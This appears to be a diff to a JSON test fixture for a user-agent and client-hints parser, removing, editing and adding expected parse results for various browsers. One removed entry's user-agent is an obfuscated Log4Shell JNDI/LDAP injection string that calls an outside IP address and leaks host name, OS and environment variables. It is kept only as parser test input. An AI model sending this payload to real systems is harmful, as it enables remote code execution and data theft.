@@ -127,90 +127,6 @@
   },
   {
     "headers": {
-      "user-agent": "T-Online Browser"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown"
-    },
-    "client": {
-      "name": "T-Online Browser",
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "browser",
-      "isbot": false
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; ABrowse 0.4; Syllable)"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": "Syllable",
-      "marketingName": "Syllable",
-      "version": null,
-      "manufacturer": "syllable"
-    },
-    "client": {
-      "name": "ABrowse",
-      "version": "0.4.0",
-      "manufacturer": "unknown",
-      "type": "browser",
-      "isbot": false
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
       "user-agent": "Dooble/0.07 (de_CH) WebKit"
     },
     "device": {
@@ -463,90 +379,6 @@
   },
   {
     "headers": {
-      "user-agent": "Arexx (compatible; MSIE 6.0; AmigaOS5.0) IBrowse 4.0"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": "Amiga OS",
-      "marketingName": "Amiga OS",
-      "version": "5.0.0",
-      "manufacturer": "unknown"
-    },
-    "client": {
-      "name": "IBrowse",
-      "version": "4.0.0",
-      "manufacturer": "unknown",
-      "type": "browser",
-      "isbot": false
-    },
-    "engine": {
-      "name": "Trident",
-      "version": null,
-      "manufacturer": "microsoft"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "robertobizzarri.altervista.org/93.146.91.10 (compatible; MSIE 7.0;)"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown"
-    },
-    "client": {
-      "name": "T-Online Browser",
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "browser",
-      "isbot": false
-    },
-    "engine": {
-      "name": "Trident",
-      "version": null,
-      "manufacturer": "microsoft"
-    }
-  },
-  {
-    "headers": {
       "user-agent": "IBrowse/20.5 (OS 10.5 2.8; en_ZA;)"
     },
     "device": {
@@ -631,21 +463,21 @@
   },
   {
     "headers": {
-      "device-memory": "4",
+      "device-memory": "2",
       "dpr": "3",
       "viewport-width": "980",
-      "rtt": "50",
-      "downlink": "6.45",
+      "rtt": "100",
+      "downlink": "9.5",
       "ect": "4g",
       "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"101\"",
       "sec-ch-ua-mobile": "?1",
       "sec-ch-ua-arch": "\"\"",
       "sec-ch-ua-platform": "\"Android\"",
-      "sec-ch-ua-platform-version": "\"8.0.0\"",
-      "sec-ch-ua-model": "\"RNE-L21\"",
+      "sec-ch-ua-platform-version": "\"6.0.1\"",
+      "sec-ch-ua-model": "\"SM-G900F\"",
       "sec-ch-ua-bitness": "\"\"",
       "sec-ch-ua-full-version-list": "\" Not A;Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"101.0.4951.41\"",
-      "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 (Ecosia android@101.0.4951.41)",
+      "user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 (Ecosia android@101.0.4951.41)",
       "sec-fetch-site": "same-origin",
       "sec-fetch-mode": "navigate",
       "sec-fetch-user": "?1",
@@ -673,7 +505,7 @@
     "os": {
       "name": "Android",
       "marketingName": "Android",
-      "version": "8.0.0",
+      "version": "6.0.1",
       "manufacturer": "google"
     },
     "client": {
@@ -687,48 +519,6 @@
       "name": "Blink",
       "version": "101.0.4951.41",
       "manufacturer": "google"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "${${:-j}${:-n}${:-d}${:-i}:${:-l}${:-d}${:-a}${:-p}://143.198.244.73:80/dn=gAAAAABjIdhlPpLMRM6s23OLg5IVGbN-g5f-kzYULlEOh2WKGQ2hKTVWMZHP6Wzr4TboAD8mj-ObpPjEWqG5EM4bj71yFWYU8map5oSc_qR4l8FjsXPMJUeKgCudSs31Hzqtvt4sOIQJ5w4FKL5IytCqaxhOc5KB4D10jw02PK34lH7RSINnv8arKra6cr1nXRe2Zq0B7p6js41OWATETA3EDSJP6_LeEkdHZk8-jzUkvMSr3a3NJH2yLXncwoQErUk0qwPyYFc4u2fEm6Lp_QmZHP7WEBomsj23Kk98t10kTSATcRDcjL7KFOtBiwEpbcOIB7tnBMkxwmxBQANqXMWZVZc__hVe-scC6umC9JJpKsrDaX4JPzv-ZAKQX8tFxXlpZpyeJpTJQ7sD6BKAk7HkHQJUnYffcscR3GwKZBv9E5_rJAkJRKayDzOf4YCC7DF2-V8_1pp6sdnh3xqmtf_KROTBSBrXkdrkcz6K2EpuSbHq6FWh_RaDqwFi9K9oPUt3kYwzATOBc0ogr-IJNnTkYtMXlJNc00X2cAUY0YPUjk1FRn49jyNTGcLhLsBhces7yCm0E8ZS_7XfXlhZgET-Dv_3ph6NE5yg--BO80vDr6tznHTl8WZxZHRQpKY9aYqFh_UVRIxgLkHcSxrvJ3-Rp5U4uEGVcW1rqQaqWccAHkhxAgqU3_xHRdiDRLGKwNce5QNi2poj_MeL_1Nj6pgEaIlAlL6gzYkvhx1OnW65aP7_AyS8y4pB70eWv74cz4KLQ8btbsmN3AR2JXBakGGHEnr9Gm0qBPYBlRW8loLV-yE6Qia_ZJwymXr0gE6eT5BOx1YLL9ZOIIOCJcKJhvBoBA-e44QTujtcvyt2KsaoOqtAIKP7SyJ_1b3F18yxSTfbu7Km2toeIeaDTTWQBQjJ7LWol1e8ouFvONUGO9bwdGsBZf2prfkPW3TwGgXx251PGilaXLjjPw9Ajunv96MCwOw7Tm_t21oyXU780uR_krqs7_4JQoOPnkpk7fBcYHnuB6k9u67k8QMzICqPockjtxa8QdkQaw==,cn='${hostName}',ou='${java:os}',ca1='${ENV:HOME:-Non}',ca2='${log4j:configParentLocation}',wca2='${ENV:HOMEPATH:-Non}'}"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": "JavaOS",
-      "marketingName": "JavaOS",
-      "version": null,
-      "manufacturer": "sun-microsystems"
-    },
-    "client": {
-      "name": "T-Online Browser",
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "browser",
-      "isbot": false
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
     }
   },
   {
@@ -771,6 +561,48 @@
       "name": "WebKit",
       "version": "5.3.0",
       "manufacturer": "apple"
+    }
+  },
+  {
+    "headers": {
+      "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"YaBrowser\";v=\"24.7\", \"Yowser\";v=\"2.5\""
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": null,
+      "brand": null,
+      "dualOrientation": false,
+      "simCount": null,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": null,
+        "size": null
+      },
+      "type": null,
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": null
+    },
+    "client": {
+      "name": "Yowser",
+      "version": "2.5.0",
+      "manufacturer": "unknown",
+      "type": "browser",
+      "isbot": false
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": null
     }
   }
 ]
